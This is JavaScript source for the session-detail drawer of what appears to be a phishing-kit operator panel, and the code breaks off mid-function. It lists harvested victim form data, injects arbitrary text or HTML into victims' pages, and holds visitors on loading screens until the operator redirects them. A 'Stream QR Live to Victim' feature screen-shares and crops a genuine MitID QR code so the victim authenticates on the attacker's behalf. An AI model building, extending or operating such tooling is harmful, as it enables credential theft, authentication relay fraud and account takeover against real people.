/**
 * ALP - Session Detail Drawer Component
 * Manages the slide-out session details panel and its interactions.
 */
const SessionDrawer = (() => {
  let onSessionUpdated = null;
  let onSessionDeleted = null;

  function init(options = {}) {
    onSessionUpdated = options.onSessionUpdated || null;
    onSessionDeleted = options.onSessionDeleted || null;

    const overlay = document.getElementById('detail-overlay');
    if (overlay) {
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) close();
      });
    }
  }

  async function open(sessionId) {
    const overlay = document.getElementById('detail-overlay');
    const panel = document.getElementById('detail-panel');
    if (!overlay || !panel) return;

    overlay.style.display = 'block';

    // Prevent background scrolling
    document.body.style.overflow = 'hidden';

    panel.innerHTML = `
      <div class="detail-header">
        <div style="display:flex; flex-direction:column; gap:2px;">
          <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0;">Session Details</h2>
          <span style="font-size:10px; font-family:'JetBrains Mono', Consolas, monospace; color:var(--text-tertiary);">${SessionTemplates.escapeHtml(sessionId)}</span>
        </div>
        <button class="detail-close" id="detail-close">&times;</button>
      </div>
      <div style="text-align:center;padding:40px;color:var(--text-tertiary);">Loading…</div>
    `;

    // Connect close button immediately
    const initCloseBtn = panel.querySelector('#detail-close');
    if (initCloseBtn) initCloseBtn.addEventListener('click', close);

    try {
      const data = await window.ALPApi.getSession(sessionId);
      const s = data.session || data;
      const pageViews = data.page_views || data.pageViews || [];

      // Handle metadata
      let metadata = {};
      try {
        const raw = s.metadata;
        if (raw && typeof raw === 'object') {
          metadata = raw;
        } else if (typeof raw === 'string' && raw.trim()) {
          metadata = JSON.parse(raw);
        }
      } catch { metadata = {}; }

      const pagePath = (s.current_page || '').toLowerCase();
      const isHolding = s.is_active && SessionTemplates.isLoadingPage(pagePath, s.current_page_type);
      const isWarning = s.is_active && s.current_page_type === 'warning';

      const infoGridHtml = SessionTemplates.renderInfoGrid(s);
      const timelineHtml = SessionTemplates.renderTimeline(pageViews);
      const formDataHtml = SessionTemplates.renderFormData(metadata);
      const formCount = (metadata.formData && metadata.formData.length) ? metadata.formData.length : 0;

      // Render tabbed panel layout
      panel.innerHTML = `
        <div class="detail-header">
          <div style="display:flex; flex-direction:column; gap:2px;">
            <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0; display:flex; align-items:center; gap:8px;">
              Session Details
              ${isHolding 
                ? `<span class="status-badge holding" style="font-size:8px; padding:1px 6px;">
                     ⏳ Holding
                   </span>`
                : isWarning
                ? `<span class="status-badge" style="font-size:8px; padding:1px 6px; background:rgba(239,68,68,0.15); color:#ef4444; border:1px solid rgba(239,68,68,0.3);">
                     🚨 Warning
                   </span>`
                : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}" style="font-size:8px; padding:1px 6px;">
                     ${s.is_active ? 'Live' : 'Offline'}
                   </span>`
              }
            </h2>
            <span style="font-size:10px; font-family:'JetBrains Mono', Consolas, monospace; color:var(--text-muted); letter-spacing:-0.2px;">${SessionTemplates.escapeHtml(s.id)}</span>
            <div style="display:flex;align-items:center;gap:6px;margin-top:5px;">
              ${SessionTemplates.websiteLogoHtml(s, 18)}
              <span style="font-size:11px;color:var(--text-secondary);font-weight:600;">${SessionTemplates.escapeHtml(s.website_name || 'Unknown Site')}</span>
            </div>
          </div>
          <button class="detail-close" id="detail-close">&times;</button>
        </div>

        <div class="detail-tabs">
          <button class="detail-tab active" data-tab="info">ℹ️ Overview</button>
          <button class="detail-tab" data-tab="data">📝 Captured Data ${formCount > 0 ? `<span class="tab-badge">${formCount}</span>` : ''}</button>
          <button class="detail-tab" data-tab="history">📍 Timeline <span class="tab-badge secondary">${pageViews.length}</span></button>
        </div>

        <div class="detail-body" id="detail-body-content">
          ${isHolding 
            ? `<div style="background:rgba(245,158,11,0.06); border:1px solid rgba(245,158,11,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#f59e0b;">
                 <span style="font-size:18px; animation: bounceSpin 2.5s infinite;">⏳</span>
                 <div>
                   <strong style="display:block; color:#f59e0b;">Visitor is Waiting on Loading Screen</strong>
                   User is waiting for your redirection response. Click "Redirect Visitor" below to redirect them.
                 </div>
               </div>`
            : ''
          }
          ${isWarning
            ? `<div style="background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#ef4444;">
                 <span style="font-size:18px;">🚨</span>
                 <div>
                   <strong style="display:block; color:#ef4444;">Visitor is on a Warning/Alert Page</strong>
                   Use the Inject Text panel below to send a custom message to the visitor's page in real-time.
                 </div>
               </div>`
            : ''
          }
          <!-- Render Info tab content by default -->
          <div class="detail-section">
            <div class="detail-sec-title">Visitor Information</div>
            <div class="detail-grid">${infoGridHtml}</div>
          </div>
        </div>

        <div class="detail-footer" style="display:flex; flex-direction:column; gap:12px;">
          <!-- Inject Text Panel — visible for active sessions only -->
          ${s.is_active ? `
          <div style="border:1px solid rgba(99,102,241,0.25); border-radius:10px; overflow:hidden;">
            <div id="inject-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(99,102,241,0.07); cursor:pointer; user-select:none;">
              <span style="font-size:11px; font-weight:700; color:#a5b4fc; letter-spacing:0.3px;">✏️ Inject Text Into Page</span>
              <span id="inject-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
            </div>
            <div id="inject-panel-body" style="display:none; padding:10px 12px; background:rgba(99,102,241,0.03); border-top:1px solid rgba(99,102,241,0.15);">
              <textarea id="inject-text-input" placeholder="Type text or HTML to inject into the visitor's page…" style="width:100%; height:70px; resize:vertical; background:rgba(15,15,20,0.6); border:1px solid rgba(99,102,241,0.3); border-radius:7px; padding:8px 10px; color:var(--text-primary); font-size:12px; font-family:Inter,sans-serif; outline:none; line-height:1.5; box-sizing:border-box;"></textarea>
              <div style="display:flex; gap:6px; margin-top:8px;">
                <button id="inject-send-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif;">💉 Inject</button>
                <button id="inject-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
              </div>
              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">The visitor's page must contain <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">data-alp-inject</code> element. Supports plain text or HTML.</p>
            </div>
          </div>
          ` : ''}

          <!-- Set QR Panel — shown only if website has a page with qr-image slot -->
          <div id="set-qr-outer" style="display:none; border:1px solid rgba(16,185,129,0.25); border-radius:10px; overflow:hidden;">
            <div id="set-qr-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(16,185,129,0.07); cursor:pointer; user-select:none;">
              <span style="font-size:11px; font-weight:700; color:#6ee7b7; letter-spacing:0.3px;">📱 Set QR Code for This Session</span>
              <span id="set-qr-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
            </div>
            <div id="set-qr-panel-body" style="display:none; padding:10px 12px; background:rgba(16,185,129,0.03); border-top:1px solid rgba(16,185,129,0.15);">
              <input type="file" id="set-qr-file-inp" accept="image/*" style="display:none;">
              <div id="set-qr-drop-zone" style="border:2px dashed rgba(16,185,129,0.35); border-radius:8px; padding:14px; text-align:center; cursor:pointer; transition:border-color 0.15s;">
                <div id="set-qr-preview-wrap" style="display:none; margin-bottom:8px;">
                  <img id="set-qr-preview" src="" alt="QR Preview" style="max-height:80px; border-radius:6px; border:1px solid rgba(16,185,129,0.3);">
                </div>
                <div id="set-qr-drop-label" style="font-size:11px; color:var(--text-secondary);">Click or drop a QR code image here</div>
                <div id="set-qr-file-name" style="font-size:10px; color:var(--text-muted); margin-top:4px;"></div>
              </div>
              <div style="display:flex; gap:6px; margin-top:8px;">
                <button id="set-qr-save-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#10b981,#059669); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; opacity:0.5;" disabled>💾 Save QR for Session</button>
                <button id="set-qr-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
              </div>
              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">Sets the <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">qr-image</code> slot on the QR page for this visitor only. Takes effect on next page load.</p>
            </div>
          </div>

          <!-- Live QR Stream Panel — shown only if website has a page with qr-image slot -->
          <style>
            @keyframes shineSweep { 0% { left:-50%; } 100% { left:150%; } }
            @keyframes pulseGlow { 0%,100% { box-shadow:0 0 20px rgba(16,185,129,0.4), 0 0 40px rgba(16,185,129,0.2); } 50% { box-shadow:0 0 30px rgba(16,185,129,0.7), 0 0 60px rgba(16,185,129,0.35); } }
            @keyframes warnPulse { 0%,100% { box-shadow:0 0 20px rgba(239,68,68,0.5), 0 0 40px rgba(239,68,68,0.25); } 50% { box-shadow:0 0 30px rgba(239,68,68,0.8), 0 0 60px rgba(239,68,68,0.4); } }
            .qr-status-ok { background:linear-gradient(135deg,#059669 0%,#10b981 50%,#34d399 100%); color:#fff; border:1px solid rgba(52,211,153,0.6); animation:pulseGlow 1.8s ease-in-out infinite; text-shadow:0 1px 2px rgba(0,0,0,0.3); }
            .qr-status-warn { background:linear-gradient(135deg,#dc2626 0%,#ef4444 50%,#f87171 100%); color:#fff; border:1px solid rgba(248,113,113,0.6); animation:warnPulse 1.2s ease-in-out infinite; text-shadow:0 1px 2px rgba(0,0,0,0.3); }
            @keyframes holdPulse { 0%,100% { box-shadow:0 0 20px rgba(251,191,36,0.4), 0 0 40px rgba(251,191,36,0.2); } 50% { box-shadow:0 0 30px rgba(251,191,36,0.7), 0 0 60px rgba(251,191,36,0.35); } }
            .qr-status-hold { background:linear-gradient(135deg,#d97706 0%,#f59e0b 50%,#fbbf24 100%); color:#fff; border:1px solid rgba(251,191,36,0.6); animation:holdPulse 1.6s ease-in-out infinite; text-shadow:0 1px 2px rgba(0,0,0,0.3); }
          </style>
          <div id="live-qr-outer" style="display:none; border:1px solid rgba(239,68,68,0.25); border-radius:10px; overflow:hidden;">
            <div id="live-qr-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(239,68,68,0.07); cursor:pointer; user-select:none;">
              <span style="font-size:11px; font-weight:700; color:#f87171; letter-spacing:0.3px;">🔴 Stream QR Live to Victim</span>
              <div style="display:flex; align-items:center; gap:10px;">
                <button id="live-qr-expand-btn" title="Expand to fullscreen" style="background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.4); color:#f87171; padding:3px 8px; border-radius:5px; font-size:10px; font-weight:700; cursor:pointer; display:flex; align-items:center; gap:3px;">⛶ Expand</button>
                <span id="live-qr-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
              </div>
            </div>
            <div id="live-qr-panel-body" style="display:none; padding:10px 12px; background:rgba(239,68,68,0.03); border-top:1px solid rgba(239,68,68,0.15);">
              <div id="live-qr-status" style="display:flex; align-items:center; gap:6px; margin-bottom:8px; font-size:11px; color:var(--text-secondary);">
                <span id="live-qr-dot" style="width:8px; height:8px; border-radius:50%; background:#6b7280; display:inline-block;"></span>
                <span id="live-qr-status-text">Not streaming</span>
              </div>
              <!-- Dual preview: full frame (with bbox overlay) + cropped QR being sent -->
              <div id="live-qr-preview-wrap" style="margin-bottom:8px;">
                <div id="live-qr-placeholder" style="border:1px dashed rgba(239,68,68,0.25); border-radius:8px; padding:16px; text-align:center; background:rgba(0,0,0,0.15); font-size:11px; color:var(--text-muted);">
                  Click Start to share your screen and stream the QR code live
                </div>
                <div id="live-qr-dual" style="display:none; gap:8px; grid-template-columns:1fr 1fr;">
                  <!-- Left: full frame with bbox overlay -->
                  <div style="position:relative; border:1px solid rgba(239,68,68,0.25); border-radius:8px; overflow:hidden; background:rgba(0,0,0,0.3);">
                    <div style="position:absolute; top:4px; left:6px; font-size:9px; font-weight:700; color:#fbbf24; letter-spacing:0.5px; text-transform:uppercase; z-index:2; background:rgba(0,0,0,0.65); padding:2px 6px; border-radius:4px;">📺 Source</div>
                    <canvas id="live-qr-full-preview" style="width:100%; height:140px; object-fit:contain; display:block; background:#000;"></canvas>
                  </div>
                  <!-- Right: cropped QR being sent -->
                  <div style="position:relative; border:1px solid rgba(16,185,129,0.35); border-radius:8px; overflow:hidden; background:rgba(0,0,0,0.3);">
                    <div style="position:absolute; top:4px; left:6px; font-size:9px; font-weight:700; color:#6ee7b7; letter-spacing:0.5px; text-transform:uppercase; z-index:2; background:rgba(0,0,0,0.65); padding:2px 6px; border-radius:4px;">📤 Sent</div>
                    <img id="live-qr-preview" src="" alt="Cropped QR" style="width:100%; height:140px; object-fit:contain; display:block; background:#fff;">
                  </div>
                </div>
              </div>
              <!-- Stats grid -->
              <div id="live-qr-stats" style="display:none; grid-template-columns:repeat(3,1fr); gap:4px; margin-bottom:8px; font-family:'JetBrains Mono',monospace;">
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(239,68,68,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">FPS</div>
                  <div id="stat-fps" style="font-size:13px; color:#f87171; font-weight:700;">—</div>
                </div>
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(239,68,68,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">Frames</div>
                  <div id="stat-frames" style="font-size:13px; color:#fbbf24; font-weight:700;">0</div>
                </div>
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(239,68,68,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">Size</div>
                  <div id="stat-size" style="font-size:13px; color:#60a5fa; font-weight:700;">—</div>
                </div>
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(16,185,129,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">Detector</div>
                  <div id="stat-detector" style="font-size:11px; color:#6ee7b7; font-weight:700;">—</div>
                </div>
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(16,185,129,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">Uptime</div>
                  <div id="stat-uptime" style="font-size:13px; color:#a78bfa; font-weight:700;">00:00</div>
                </div>
                <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(16,185,129,0.15); border-radius:6px; padding:6px 8px;">
                  <div style="font-size:8px; color:var(--text-muted); letter-spacing:0.5px; text-transform:uppercase; margin-bottom:2px;">QR Box</div>
                  <div id="stat-qrbox" style="font-size:11px; color:#6ee7b7; font-weight:700;">—</div>
                </div>
              </div>
              <div style="display:flex; gap:6px; margin-top:4px;">
                <button id="live-qr-start-btn" style="flex:2; padding:8px; background:linear-gradient(135deg,#ef4444,#dc2626); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:4px;">🔴 Start Streaming</button>
                <button id="live-qr-stop-btn" style="flex:1; padding:8px; background:rgba(107,114,128,0.15); border:1px solid rgba(107,114,128,0.3); color:#9ca3af; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" disabled>⏹ Stop</button>
              </div>
              <div style="display:flex; gap:6px; margin-top:6px;">
                <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:4px; cursor:pointer;">
                  <span>Interval:</span>
                  <select id="live-qr-interval" style="padding:2px 4px; background:rgba(15,15,20,0.6); border:1px solid rgba(239,68,68,0.3); border-radius:4px; color:var(--text-primary); font-size:10px;">
                    <option value="300">300ms (fast)</option>
                    <option value="500" selected>500ms</option>
                    <option value="1000">1s</option>
                    <option value="2000">2s</option>
                  </select>
                </label>
                <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:4px; cursor:pointer;">
                  <span>Quality:</span>
                  <select id="live-qr-quality" style="padding:2px 4px; background:rgba(15,15,20,0.6); border:1px solid rgba(239,68,68,0.3); border-radius:4px; color:var(--text-primary); font-size:10px;">
                    <option value="0.5">Low</option>
                    <option value="0.7" selected>Medium</option>
                    <option value="0.9">High</option>
                  </select>
                </label>
              </div>
              <div style="display:flex; gap:14px; margin-top:6px; align-items:center; flex-wrap:wrap;">
                <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:5px; cursor:pointer;">
                  <input type="checkbox" id="live-qr-smart" checked style="margin:0; cursor:pointer;">
                  <span>🎯 Smart Crop (auto-detect QR)</span>
                </label>
                <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:5px; cursor:pointer;" title="When detection fails, keep showing the last captured QR on the victim's page">
                  <input type="checkbox" id="live-qr-hold" checked style="margin:0; cursor:pointer;">
                  <span>🔒 Hold last QR on miss</span>
                </label>
              </div>
              <!-- Shiny status banner -->
              <div id="live-qr-detect-status" style="display:none; margin-top:8px; padding:10px 14px; border-radius:10px; font-size:14px; font-weight:800; letter-spacing:0.4px; text-align:center; text-transform:uppercase; position:relative; overflow:hidden; transition:all 0.3s ease;">
                <span id="live-qr-detect-status-text" style="position:relative; z-index:2;"></span>
                <span class="shine-sweep" style="position:absolute; top:0; left:-100%; width:50%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent); animation:shineSweep 2.4s infinite; z-index:1;"></span>
              </div>
              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">Shares your screen/tab showing the real MitID QR. Smart Crop auto-detects the QR and sends only that region — fits perfectly on the victim's page.</p>
            </div>
          </div>

          <!-- Status Header -->
          <div style="font-size:10px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; display:flex; justify-content:space-between; align-items:center;">
            <span>Session Controls</span>
            ${isHolding 
              ? '<span style="color:#f59e0b; font-weight:bold; animation: alertBlink 1.2s infinite;">⚠️ Awaiting Release</span>'
              : isWarning
              ? '<span style="color:#ef4444; font-weight:bold; animation: alertBlink 1.2s infinite;">🚨 Warning Page</span>'
              : `<span style="color:${s.is_active ? '#10b981' : 'var(--text-tertiary)'}; text-transform:none;">${s.is_active ? '● Active' : 'Offline'}</span>`
            }
          </div>

          <!-- Action Buttons Row -->
          <div style="display:flex; gap:8px;">
            <button id="detail-redirect-modal-trigger" data-sid="${s.id}" style="flex:2; padding:9px; background:linear-gradient(135deg,#D4AF37,#B8962E); color:#0a0a0a; border:none; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:6px;" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
              ↗️ Redirect Visitor
            </button>

            <button id="detail-block-ip" data-ip="${s.ip_address || ''}" style="flex:1; padding:9px; background:rgba(217,119,6,0.12); border:1px solid rgba(217,119,6,0.3); color:#f59e0b; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Block Visitor IP">
              🚫 Block IP
            </button>
            
            ${s.is_active ? `
              <button id="detail-end-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Force End Session">
                ⛔ End Session
              </button>
            ` : `
              <button id="detail-delete-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Permanently Delete Session">
                🗑️ Delete
              </button>
            `}
          </div>
        </div>

      `;

      // Connect close button
      const closeBtn = panel.querySelector('#detail-close');
      if (closeBtn) closeBtn.addEventListener('click', close);

      // Inject panel toggle
      const injectToggle = panel.querySelector('#inject-panel-toggle');
      const injectBody = panel.querySelector('#inject-panel-body');
      const injectChevron = panel.querySelector('#inject-chevron');
      if (injectToggle && injectBody) {
        injectToggle.addEventListener('click', () => {
          const open = injectBody.style.display !== 'none';
          injectBody.style.display = open ? 'none' : 'block';
          if (injectChevron) injectChevron.style.transform = open ? '' : 'rotate(180deg)';
        });
      }

      // Inject send button
      const injectSendBtn = panel.querySelector('#inject-send-btn');
      const injectInput = panel.querySelector('#inject-text-input');
      if (injectSendBtn && injectInput) {
        injectSendBtn.addEventListener('click', async () => {
          const text = injectInput.value;
          try {
            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
              window.ALPSocket.injectText(s.id, text);
            } else {
              await window.ALPApi.injectText(s.id, text);
            }
            window.showToast('✅ Text injected!', 'success');
          } catch (e) {
            window.showToast('Failed to inject: ' + e.message, 'error');
          }
        });
      }

      // Inject clear button
      const injectClearBtn = panel.querySelector('#inject-clear-btn');
      if (injectClearBtn) {
        injectClearBtn.addEventListener('click', async () => {
          if (injectInput) injectInput.value = '';
          try {
            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
              window.ALPSocket.injectText(s.id, '');
            } else {
              await window.ALPApi.injectText(s.id, '');
            }
            window.showToast('✅ Injection cleared!', 'success');
          } catch (e) {
            window.showToast('Failed to clear: ' + e.message, 'error');
          }
        });
      }


      // Connect tab buttons
      const tabButtons = panel.querySelectorAll('.detail-tab');
      const bodyContent = panel.querySelector('#detail-body-content');

      tabButtons.forEach(btn => {
        btn.addEventListener('click', () => {
          tabButtons.forEach(b => b.classList.remove('active'));
          btn.classList.add('active');
          const tab = btn.dataset.tab;

          if (tab === 'info') {
            bodyContent.innerHTML = `
              <div class="detail-section">
                <div class="detail-sec-title">Visitor Information</div>
                <div class="detail-grid">${infoGridHtml}</div>
              </div>
            `;
          } else if (tab === 'data') {
            bodyContent.innerHTML = formDataHtml;
          } else if (tab === 'history') {
            bodyContent.innerHTML = `
              <div class="detail-section">
                <div class="detail-sec-title">Page View History</div>
                <div style="padding-left:4px; margin-top: 10px;">${timelineHtml}</div>
              </div>
            `;
          }
        });
      });

      // Redirect modal trigger action
      const redirectTrigger = panel.querySelector('#detail-redirect-modal-trigger');
      if (redirectTrigger) {
        redirectTrigger.addEventListener('click', () => {
          if (window.SessionsPage && typeof window.SessionsPage.showRedirectModal === 'function') {
            window.SessionsPage.showRedirectModal(s.id);
          } else {
            console.error('SessionsPage.showRedirectModal not found');
          }
        });
      }

      // Block IP action
      const blockIpBtn = panel.querySelector('#detail-block-ip');
      if (blockIpBtn) {
        blockIpBtn.addEventListener('click', async () => {
          const ipToBlock = blockIpBtn.dataset.ip;
          if (!ipToBlock) {
            window.showToast('No IP address found for this session', 'error');
            return;
          }
          window.showModal({
            title: 'Block IP Address',
            content: `<p>Are you sure you want to block IP address <strong>${SessionTemplates.escapeHtml(ipToBlock)}</strong>?</p><p style="font-size:12px;color:var(--text-secondary);margin-top:8px;">All future requests and socket connections from this IP will be rejected immediately.</p>`,
            type: 'danger',
            confirmText: 'Block IP',
            onConfirm: async () => {
              try {
                await window.ALPApi._post('/api/security/blocked-ips', {
                  ip_address: ipToBlock,
                  type: 'manual',
                  reason: `Blocked from session drawer (${s.id})`
                });
                window.showToast(`IP ${ipToBlock} blocked successfully!`, 'success');
                if (s.is_active) {
                  try { await window.ALPApi.endSession(s.id); } catch (e) {}
                  onSessionUpdated && onSessionUpdated(s.id, { is_active: false });
                }
                open(s.id);
              } catch (e) {
                window.showToast('Failed to block IP: ' + (e.message || 'Error'), 'error');
              }
            }
          });
        });
      }


      // End session action
      const endBtn = panel.querySelector('#detail-end-session');
      if (endBtn) {
        endBtn.addEventListener('click', async () => {
          window.showModal({
            title: 'End Session',
            content: `<p>Are you sure you want to force-end session <strong>${SessionTemplates.escapeHtml(s.visitor_id || s.id)}</strong>?</p>`,
            onConfirm: async () => {
              try {
                await window.ALPApi.endSession(s.id);
                window.showToast('Session ended successfully', 'success');
                if (onSessionUpdated) {
                  onSessionUpdated(s.id, { is_active: false });
                }
                // Refresh drawer
                open(s.id);
              } catch (e) { window.showToast('Failed to end session: ' + e.message, 'error'); }
            }
          });
        });
      }

      // Delete session action
      const deleteBtn = panel.querySelector('#detail-delete-session');
      if (deleteBtn) {
        deleteBtn.addEventListener('click', async () => {
          window.showModal({
            title: 'Delete Session',
            content: `<p>Are you sure you want to permanently delete session <strong>${SessionTemplates.escapeHtml(s.visitor_id || s.id)}</strong>? All recorded page views and data will be lost.</p>`,
            type: 'danger',
            onConfirm: async () => {
              try {
                await window.ALPApi.deleteSession(s.id);
                window.showToast('Session deleted permanently', 'success');
                close();
                if (onSessionDeleted) {
                  onSessionDeleted(s.id);
                }
              } catch (e) { window.showToast('Failed to delete session: ' + e.message, 'error'); }
            }
          });
        });
      }

      // Set QR panel — only show if website has a page with 'qr-image' in slot_names
      const setQrOuter = panel.querySelector('#set-qr-outer');
      const setQrToggle = panel.querySelector('#set-qr-panel-toggle');
      const setQrBody = panel.querySelector('#set-qr-panel-body');
      const setQrChevron = panel.querySelector('#set-qr-chevron');
      const setQrDropZone = panel.querySelector('#set-qr-drop-zone');
      const setQrFileInp = panel.querySelector('#set-qr-file-inp');
      const setQrPreviewWrap = panel.querySelector('#set-qr-preview-wrap');
      const setQrPreview = panel.querySelector('#set-qr-preview');
      const setQrDropLabel = panel.querySelector('#set-qr-drop-label');
      const setQrFileName = panel.querySelector('#set-qr-file-name');
      const setQrSaveBtn = panel.querySelector('#set-qr-save-btn');
      const setQrClearBtn = panel.querySelector('#set-qr-clear-btn');
      let qrBase64 = null;
      let _qrTargetPage = null; // the specific page that has qr-image registered

      // Async: check if any registered page for this website declares 'qr-image' slot
      if (setQrOuter && s.website_id) {
        (async () => {
          try {
            const pagesData = await window.ALPApi.getDemoPages(s.website_id);
            const pages = pagesData.pages || pagesData || [];
            // Find page whose slot_names includes 'qr-image'
            const qrPage = pages.find(pg => {
              const slots = Array.isArray(pg.slot_names)
                ? pg.slot_names
                : String(pg.slot_names || '').split(',').map(x => x.trim()).filter(Boolean);
              return slots.includes('qr-image');
            });
            if (qrPage) {
              _qrTargetPage = qrPage;
              setQrOuter.style.display = 'block';

              // ── Pre-populate preview if a QR was already saved for this session ──
              try {
                const visitorId = s.visitor_id || s.id;
                const slotsRes = await window.ALPApi.getPageSlots(s.website_id, qrPage.id, {
                  sessionId: visitorId,
                  full: true
                });
                const slots = slotsRes.slots || [];
                const existing = slots.find(sl => sl.slot_name === 'qr-image' && sl.session_id === visitorId);
                if (existing && existing.content) {
                  qrBase64 = existing.content;
                  if (setQrPreview) setQrPreview.src = qrBase64;
                  if (setQrPreviewWrap) setQrPreviewWrap.style.display = 'block';
                  if (setQrDropLabel) setQrDropLabel.textContent = '✅ QR currently active for this session';
                  if (setQrFileName) {
                    const when = existing.updated_at ? new Date(existing.updated_at).toLocaleString() : '';
                    setQrFileName.textContent = when ? 'Saved ' + when : 'Saved';
                  }
                  if (setQrSaveBtn) {
                    setQrSaveBtn.disabled = true;
                    setQrSaveBtn.style.opacity = '0.5';
                    setQrSaveBtn.textContent = '💾 Save QR for Session';
                  }
                }
              } catch (_) { /* no slot saved yet — leave panel empty */ }
            }
            // If no page declares qr-image, panel stays hidden
          } catch (_) { /* silently skip */ }
        })();
      }

      if (setQrToggle && setQrBody) {
        setQrToggle.addEventListener('click', () => {
          const open = setQrBody.style.display !== 'none';
          setQrBody.style.display = open ? 'none' : 'block';
          if (setQrChevron) setQrChevron.style.transform = open ? '' : 'rotate(180deg)';
        });
      }

      function applyQrFile(file) {
        if (!file || !file.type.startsWith('image/')) {
          window.showToast('Please select an image file', 'error');
          return;
        }
        const reader = new FileReader();
        reader.onload = (e) => {
          qrBase64 = e.target.result;
          if (setQrPreview) { setQrPreview.src = qrBase64; }
          if (setQrPreviewWrap) setQrPreviewWrap.style.display = 'block';
          if (setQrDropLabel) setQrDropLabel.textContent = 'Image selected — ready to save';
          if (setQrFileName) setQrFileName.textContent = file.name;
          if (setQrSaveBtn) { setQrSaveBtn.disabled = false; setQrSaveBtn.style.opacity = '1'; }
        };
        reader.readAsDataURL(file);
      }

      if (setQrDropZone) {
        setQrDropZone.addEventListener('click', () => setQrFileInp && setQrFileInp.click());
        setQrDropZone.addEventListener('dragover', (e) => { e.preventDefault(); setQrDropZone.style.borderColor = '#10b981'; });
        setQrDropZone.addEventListener('dragleave', () => { setQrDropZone.style.borderColor = 'rgba(16,185,129,0.35)'; });
        setQrDropZone.addEventListener('drop', (e) => {
          e.preventDefault();
          setQrDropZone.style.borderColor = 'rgba(16,185,129,0.35)';
          const file = e.dataTransfer.files[0];
          if (file) applyQrFile(file);
        });
      }

      if (setQrFileInp) {
        setQrFileInp.addEventListener('change', () => {
          if (setQrFileInp.files[0]) applyQrFile(setQrFileInp.files[0]);
        });
      }

      if (setQrClearBtn) {
        setQrClearBtn.addEventListener('click', () => {
          qrBase64 = null;
          if (setQrFileInp) setQrFileInp.value = '';
